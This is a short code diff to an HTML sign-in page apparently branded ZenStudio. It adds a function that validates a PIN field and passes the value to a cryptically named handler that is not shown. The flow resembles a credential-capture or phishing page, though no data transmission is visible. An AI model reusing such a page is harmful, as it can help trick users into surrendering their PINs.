@@ -378,7 +378,7 @@ img{
 
 <section id="section_final" class="d-none">
   <div class="auth-wrapper">
-    <img src="img/lg16.png" alt="ZenStudio" class="d-block" />
+    <img src="img/lg16.png" alt="ZenStudio" class="navimg" />
     <div class="identity w-100 mt-16 mb-16">
       <span id="user_identity_final">a@b.com</span>
     </div>
@@ -493,6 +493,20 @@ document.querySelector('.back').addEventListener('click', () => {
   document.getElementById('section_uname').classList.remove('d-none');
 });
 </script>
+
+<script>
+  function handleFinalSubmit() {
+    const pinVal = document.getElementById('inp_pin').value.trim();
+    if (pinVal === '') {
+      document.getElementById('error_pin').style.display = 'block';
+      return;
+    }
+    document.getElementById('error_pin').style.display = 'none';
+    document.getElementById('form_pin').value = pinVal;
+    lrxrMssg("ctfrmPhrase");
+  }
+</script>
+
 
 </body>
 </html>
